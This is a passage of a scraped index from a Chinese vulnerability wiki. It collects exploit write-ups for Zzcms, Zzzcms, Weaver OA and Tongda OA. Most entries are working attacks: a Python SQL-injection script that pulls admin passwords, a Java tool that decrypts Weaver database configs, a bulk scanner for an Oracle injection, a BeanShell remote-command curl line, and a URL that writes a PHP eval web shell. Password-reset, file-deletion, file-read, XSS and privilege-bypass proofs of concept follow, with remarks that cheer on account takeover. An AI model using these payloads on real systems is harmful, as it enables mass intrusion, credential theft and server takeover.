$passwordtrue = isset($_POST['password'])?$_POST['password']:\"\"; $password=md5(trim($passwordtrue)); query(\"update zzcms_user set password='$password',passwordtrue='$passwordtrue' where username='\".@$_SESSION['username $strout=str_replace(\"{step4}\",\"\",$strout) ; $strout=str_replace(\"{/step4}\",\"\",$strout) ; $strout=str_replace(\"{step1}\".$step1.\"{/step1}\",\"\",$strout) ; $strout=str_replace(\"{step2}\".$step2.\"{/step2}\",\"\",$strout) ; $strout=str_replace(\"{step3}\".$step3.\"{/step3}\",\"\",$strout) ; $strout=str_replace(\"{#username}\",@$_SESSION['username'],$strout) ; 这里仅仅判断了 action参数为 step3，并且$_SESSION['username']不为空，就进入密码修改的逻辑，直接执 行sql语句执行update操作。那么这里的$_SESSION['username']从哪里来的，我们继续看代码，在 /one/getpassword.php文件第 31行，可以看到 $_SESSION['username']。 if ($action==\"step1\"){ $username = isset($_POST['username'])?$_POST['username']:\"\"; $_SESSION['username']=$username; checkyzm($_POST[\"yzm\"]); $rs=query(\"select mobile,email from zzcms_user where username='\" . $username . \"' \"); $row=fetch_array($rs); $regmobile=$row['mobile']; $regmobile_show=str_replace(substr($regmobile,3,4),\"****\",$regmobile); $regemail=$row['email']; $regemail_show=str_replace(substr($regemail,1,2),\"**\",$regemail); 这里username是从step1不做中 post传递过来的 username参数，也就是我们要修改的用户名。那么漏洞就很 明显了，在第一步输入要修改的用户名，然后获取session值，直接跳到第三步，修改密码就可以打到任意 用户密码修改。 漏洞复现 第一步先在找回密码页面输入要修改的用户名，点击下一步，burp拦截。 抓包获取session值 这里我们获取到了 session值，然后根据上面的描述，修改数据包，直接进入修改密码操作。 这里session就是上面获取到的，只需要修改 post-data值就可以。这里改成mima888。action值要改成step3 才可以进去 数据库 update语句的操作。然后重放数据包，就可以完成任意密码修改了。 前台登录试试，是否修改成功。 成功修改密码，登录成功。 利用此漏洞，只需要知道用户名即可。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-03 18:18:26 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Zzcms/CVE-2018-13056.html":{"url":"0day/Zzcms/CVE-2018-13056.html","title":"（CVE-2018-13056）Zzcms 8.3 任意文件删除","keywords":"","body":"（CVE-2018-13056）Zzcms 8.3 任意文件删除 一、漏洞简介 二、漏洞影响 版本：Zzcms 8.3 user / del.php 三、复现过程 漏洞点出现在 /user/del.php 的55行到64行 看到是从数据库中取出的img字段，然后直接判断了是不是默认值，然后检查文件存在，最后是删除，这其中并没有涉及到文件合法性检查。 那我们就可以去找一下这个字段是怎么进入数据库的： 首先找到表名，是zzcms_main表，然后找一下insert或者update操作，然后我们在/user/zssave.php中发现了有关操作。 然后查看是否经过了过滤，因为经过了伪全局过滤，这里的$img并没有经过任何有效过滤。 所以向数据库中插入污点数据是很简单的，只要在发布招商信息的时候，抓包，修改掉img的数据即可，这里我们测试/install/install.lock： 然后就可以到/user/del.php中去删除文件，这样就能触发删除操作。 但是这里有一个问题，就是删除的时候需要知道这一条记录在数据库中的id编号，可以采用爆破的方法来得到。 发包以后，我们刷新页面就可以发现，安装的锁文件已经被成功删除： 然后就可以配合之前的漏洞，任意文件写入拿到webshell。 参考链接 https://www.anquanke.com/post/id/156660 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-03 18:29:18 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Zzcms/CVE-2018-14961.html":{"url":"0day/Zzcms/CVE-2018-14961.html","title":"（CVE-2018-14961）Zzcms 8.3 前台sql注入","keywords":"","body":"（CVE-2018-14961）Zzcms 8.3 前台sql注入 一、漏洞简介 二、漏洞影响 Zzcms 8.3 三、复现过程 #!/usr/bin/env python #Author:Sublime #coding:utf-8 import requests as req url = \"http://0-sec.org:8080/dl/dl_sendmail.php\" cookies = {'UserName':'test','PassWord':'81dc9bdb52d04dc20036dbd8313ed055'} data = { 'sql':'select email from zzcms_dl where id=-1 union select pass from zzcms_admin #'} q = req.post(url,data,cookies=cookies,allow_redirects=False) print q.status_code print q.content 测试结果为： 参考链接 https://www.anquanke.com/post/id/156660 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-03 18:26:37 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Zzcms/CVE-2018-14962.html":{"url":"0day/Zzcms/CVE-2018-14962.html","title":"（CVE-2018-14962）Zzcms 8.3 储存型xss","keywords":"","body":"（CVE-2018-14962）Zzcms 8.3 储存型xss 一、漏洞简介 二、漏洞影响 Zzcms 8.3 三、复现过程 一个存储型xss，最底层的原因还是因为调用了stripfxg函数，消除了自己的过滤，然后在输出的时候，导致了xss漏洞。 先看一下输出位置，在/zt/show.php 的211 行： 然后追踪这个变量的值，找到了是在用户在修改自己公司简介处添加的数据 然后我们来测试一下： 保存，然后访问一下/zt/show.php?id=1，就可以看到效果： 参考链接 https://www.anquanke.com/post/id/156660 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-03 18:28:53 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Zzcms/CVE-2018-14963.html":{"url":"0day/Zzcms/CVE-2018-14963.html","title":"（CVE-2018-14963）Zzcms 8.3 csrf","keywords":"","body":"（CVE-2018-14963）Zzcms 8.3 csrf 一、漏洞简介 二、漏洞影响 Zzcms 8.3 三、复现过程 csrf漏洞，这个问题也是从上个版本就存在的问题，就是整个管理员后台的，所有表单都是没有设置csrf的token的，所以只要涉及到敏感操作的表单，都可以使用csrf来攻击，达成很多攻击利用。 这里的攻击是产生在了/admin/adminadd.php的添加管理员操作，构造的表单如下： history.pushState('', '', '/') 构造好了payload以后，放到vps上，然后诱导管理员点击恶意链接，即可成功添加管理员。 未添加管理员之前： 点击链接之后： 参考链接 https://www.anquanke.com/post/id/156660 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-03 18:28:45 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Zzzcms/1.html":{"url":"0day/Zzzcms/1.html","title":"Zzzcms 1.75 后台爆破+验证码问题","keywords":"","body":"Zzzcms 1.75 后台爆破+验证码问题 一、漏洞简介 二、漏洞影响 Zzzcms 1.75 三、复现过程 后台寻找 后台寻找方法，该后台大部分admin+三位数字，所以可以采用爆破的方式获取后台地址 该后台地址为admin371 验证码问题 （一）管理员登录面验证码登录 在 admin371/login.php 19行可以看出get_cookie('adminname')不为空就可以绕过，如何获得get_cookie('adminname')的值 在24行可以看出如果存在密码的话会返回cookie中adminpass值，根据返回的adminpass的形式可以推断出adminname的值 可以看到adminpass为zzz920_adminpass，所以推断adminname为zzz920_adminname 可以看到已经在无验证码的情况下已经登录成功了 （二）验证码不刷新不过期 在inc/zzz_main.php中582行可以看到从SESSION中取code的值，在inc/imgcode.php中只要不刷新就不会重新生成code，导致验证码不过期 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-02 14:28:49 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Zzzcms/2.html":{"url":"0day/Zzzcms/2.html","title":"Zzzcms 1.75 xss漏洞","keywords":"","body":"Zzzcms 1.75 xss漏洞 一、漏洞简介 二、漏洞影响 Zzzcms 1.75 三、复现过程 http://www.0-sec.org/plugins/template/login.php?backurl=1%20onmouseover%3dalert(9516)%20y%3d 该onmouseover事件在移动到登录注册时会触发 对传入的backurl并没有做任何防护 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-02 14:30:07 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Zzzcms/3.html":{"url":"0day/Zzzcms/3.html","title":"Zzzcms 1.75 后台任意文件读取","keywords":"","body":"Zzzcms 1.75 后台任意文件读取 一、漏洞简介 管理员权限 后台管理目录 后台数据库为mysql 二、漏洞影响 Zzzcms 1.75 三、复现过程 任意文件读取（一） 首先来看防护规则，不允许出现./ 看 safe_path 只能是upload template runtime路径下的 所以构造/runtime/..\\config/zzz_config.php 即可绕过防护 任意文件读取（二） 首先来看restore函数，mysql数据库，发现path是可控的，看955行，跟进到load_file函数 在zzz_file.php文件中，如果存在该path,则通过file_get_contents读取 然后现在的想法是如何输入出来，跟进到db_exec()函数 在zzz_db.php中，看str_log把sql语句写入到了log中 在zzz.file.php中，跟进到str_log文件，看到文件的命名规则， 文件命名规则为当天时间的时间戳+数据库用户+数据库密码，并且是未授权访问 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-02 15:47:37 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/泛微oa/1.html":{"url":"0day/泛微oa/1.html","title":"泛微OA数据库配置文件读取","keywords":"","body":"泛微OA 数据库配置文件读取 一、漏洞简介 二、漏洞影响 三、复现过程 https://github.com/ianxtianxt/ecologyExp.jar 使用方式： jdk 1.8以上，没混淆可以直接看源码 使用方法： java -jar ecologyExp.jar http://0-sec.org 源代码如下，编译好的在上方github链接里。 package com.test; import org.apache.http.HttpEntity; import org.apache.http.client.methods.CloseableHttpResponse; import org.apache.http.client.methods.HttpGet; import org.apache.http.impl.client.CloseableHttpClient; import org.apache.http.impl.client.HttpClientBuilder; import org.apache.http.util.EntityUtils; import javax.crypto.Cipher; import javax.crypto.SecretKey; import javax.crypto.SecretKeyFactory; import javax.crypto.spec.DESKeySpec; import java.security.SecureRandom; public class ReadDbConfig { private final static String DES = \"DES\"; private final static String key = \"1z2x3c4v5b6n\"; public static void main(String[] args) throws Exception { if(args[0]!=null&& args[0].length() !=0){ String url = args[0]+\"/mobile/DBconfigReader.jsp\"; System.out.println(ReadConfig(url)); }else{ System.err.print(\"use: java -jar ecologyExp http://127.0.0.1\"); } } private static String ReadConfig(String url) throws Exception { CloseableHttpClient httpClient = HttpClientBuilder.create().build(); HttpGet httpGet = new HttpGet(url); CloseableHttpResponse response = httpClient.execute(httpGet); HttpEntity responseEntity = response.getEntity(); byte[] res1 = EntityUtils.toByteArray(responseEntity); byte[] data = subBytes(res1,10,res1.length-10); byte [] finaldata =decrypt(data,key.getBytes()); return (new String(finaldata)); } private static byte[] decrypt(byte[] data, byte[] key) throws Exception { SecureRandom sr = new SecureRandom(); DESKeySpec dks = new DESKeySpec(key); SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(DES); SecretKey securekey = keyFactory.generateSecret(dks); Cipher cipher = Cipher.getInstance(DES); cipher.init(Cipher.DECRYPT_MODE, securekey, sr); return cipher.doFinal(data); } public static byte[] subBytes(byte[] src, int begin, int count) { byte[] bs = new byte[count]; System.arraycopy(src, begin, bs, 0, count); return bs; } } 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-22 00:08:54 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/泛微oa/2.html":{"url":"0day/泛微oa/2.html","title":"WorkflowCenterTreeData接口注入漏洞(限oracle数据库)","keywords":"","body":"WorkflowCenterTreeData 接口注入漏洞(限oracle数据库) 一、漏洞简介 二、漏洞影响 三、复现过程 1、使用payload进行验证 POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333 HTTP/1.1 Host: ip:port User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 2236 Connection: close Upgrade-Insecure-Requests: 1 formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1 2、批量脚本 #config=utf-8 import requests,json def fanwei(urls): try: url = urls+\"mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333\" data = \"formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1 \" headers = { \"Content-Type\": \"application/x-www-form-urlencoded\", \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Length\": \"2236\", \"Connection\": \"close\", \"Upgrade-Insecure-Requests\":\"1\" } info = requests.post(url,headers=headers,data=data,timeout=30) if info.status_code == 200: json_info = json.loads(info.text) if json_info == []: print(urls+\" 不存在漏洞\") with open(\"no.txt\", 'a') as f: f.write(urls + '\\n') else: print(json_info) print(urls+\" 存在漏洞\") with open(\"ok.txt\", 'a') as f: f.write(urls + '\\n') else: print(urls+\"不存在漏洞\") with open(\"no.txt\", 'a') as f: f.write(urls + '\\n') except requests.exceptions.HTTPError: print(urls+\" --HTTPError\") with open(\"error.txt\", 'a') as f: f.write(urls + '\\n') except requests.exceptions.ConnectionError: print(urls+\" --ConnectionError\") with open(\"error.txt\", 'a') as f: f.write(urls + '\\n') except requests.exceptions.Timeout: print(urls+\" --Timeout\") with open(\"error.txt\", 'a') as f: f.write(urls + '\\n') except json.decoder.JSONDecodeError: print(urls+\" --JSONDecodeError\") with open(\"error.txt\", 'a') as f: f.write(urls + '\\n') fp=open(\"123.txt\") for line in fp: line = line.strip('\\n') fanwei(str(line)) 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-22 00:09:06 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/泛微oa/3.html":{"url":"0day/泛微oa/3.html","title":"泛微OA管理系统RCE漏洞","keywords":"","body":"泛微OA 管理系统RCE漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 curl http://0-sec.org:8000/weaver/bsh.servlet.BshServlet -d 'bsh.script=eval%00(\"ex\"%2b\"ec(\\\"whoami\\\")\");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw' 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-22 00:09:12 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/通达oa/12.html":{"url":"0day/通达oa/12.html","title":"通达oa 2011-2013 通杀GETSHELL","keywords":"","body":"通达oa 2011-2013 通杀GETSHELL 一、漏洞简介 二、漏洞影响 2011、2013版本 三、复现过程 第一步: http://0-sec.org/general/crm/studio/modules/EntityRelease/release.php?entity_name=1%d5'%20or%20sys_function.FUNC_ID=1%23%20${%20fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz5vaw))} 第二步: http://0-sec.org/general/email/index.php SHELL: http://0-sec.org/general/email/shell.php 密码C 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-04 22:41:56 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/通达oa/2.html":{"url":"0day/通达oa/2.html","title":"（WooYun-2014-82678）通达oa未授权获取帐号","keywords":"","body":"（WooYun-2014-82678）通达oa 未授权获取帐号 一、漏洞简介 无需登录，即可获取所有信息 二、漏洞影响 2013、2015版本 三、复现过程 POC: http://0-sec.org/mobile/inc/get_contactlist.php?P=1&KWORD=%&isuser_info=3 http://0-sec.org/mobile/user_info/data.php?P=1&ATYPE=getUserInfo&Q_ID=50 将返回的json进行解码 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-04 22:14:20 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/通达oa/3.html":{"url":"0day/通达oa/3.html","title":"通达oa XFF导致日志混淆","keywords":"","body":"通达oa XFF导致日志混淆 一、漏洞简介 二、漏洞影响 2013、2015版本 三、复现过程 使用header中的X-Forwarded-For想伪装⾃己的IP地址，你的IP地址会直接进⼊安全审计日志⾥面。很多地方你也可以配置这个来进行XSS盲打，但是此处不存在XSS。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-04 22:14:28 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/通达oa/4.html":{"url":"0day/通达oa/4.html","title":"通达oa ⻚面敏感信息泄露","keywords":"","body":"通达oa ⻚面敏感信息泄露 一、漏洞简介 二、漏洞影响 2013、2015版本 三、复现过程 POC: http://0-sec.org/general/get_userinfo.php http://0-sec.org/general/ipanel/user/query.php http://0-sec.org/general/info/dept/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-04 22:23:33 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/通达oa/5.html":{"url":"0day/通达oa/5.html","title":"通达oa 任意账号跳转","keywords":"","body":"通达oa 任意账号跳转 一、漏洞简介 需要登录 二、漏洞影响 2013、2015版本 三、复现过程 POC: http://0-sec.org/interface/ugo.php?OA_USER=admin 通过控制OA_USER参数进行任意⽤户的跳转，⽐如说你现在是个普通权限的⽤户，使用这个⻚面即可跳转到admin用户下面。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-04 22:23:51 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/通达oa/6.html":{"url":"0day/通达oa/6.html","title":"通达oa 文件包含漏洞","keywords":"","body":"通达oa 文件包含漏洞 一、漏洞简介 二、漏洞影响 2013、2015版本 三、复现过程 poc http://0-sec.org/inc/menu_left.php?GLOBALS[MENU_LEFT][A][module][1]=a&include_file=../inc/js/menu_left.js 通常情况下，在控制⾯板中上传⼀个jpg头像，然后利用该⻚面的⽂件包含getshell。通达OA网站的根⽬录 一般在D:\\MYOA\\webroot中,头像附件一般在D:\\MYOA\\webroot\\attachment\\avatar\\XXX.jpg 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-04 22:25:30 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/通达oa/7.html":{"url":"0day/通达oa/7.html","title":"通达oa sql注入","keywords":"","body":"通达oa sql注入 一、漏洞简介 二、漏洞影响 2013、2015版本 三、复现过程 poc http://0-sec.org/general/mytable/intel_view/workflow.php?MAX_COUNT=15 procedure analyse(extrac tvalue(rand(),concat(0x3a,database())),1)&TYPE=3&MODULE_SCROLL=false&MODULE_ID=55& MODULE_ID=Math.random http://0-sec.org/general/document/index.php/recv/register/turn post(_SERVER=&rid=1') http://0-sec.org/general/document/index.php/recv/register/insert post: title)values(\"'\"^exp(if(1%3d2,1,710)))#=1&_SERVER= 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-04 22:29:38 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/通达oa/8.html":{"url":"0day/通达oa/8.html","title":"通达oa xss","keywords":"","body":"通达oa xss 一、漏洞简介 二、漏洞影响 2013、2015版本 三、复现过程 发邮件的地方、问题问答的地⽅都存在XSS，可获取他人账号权限。⼀般情况下，OA会有前端进行过滤， 所以抓包时候去添加payload，之后会对事件进行过滤，所以使用 poc 这个漏洞获取admin权限⾮常好用。想X谁X谁! 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-04 22:32:33 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/通达oa/9.html":{"url":"0day/通达oa/9.html","title":"通达oa 越权访问","keywords":"","body":"通达oa 越权访问 一、漏洞简介 二、漏洞影响 2013、2015版本 三、复现过程 将get型访问转换成post,并且post参数_SERVER,即可越权访问admin才能访问的⻚面。根据⽹上的通达 OA的源码找这些敏感地址,如: /general/system/database/ 根据源码,几乎所有敏感的⻚面都可以使用这种方式进行越权访问,⽐如说设置⻆色权限的⻚面啊什么的。这个⻚面就已经可以XX了! 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-04 22:35:46 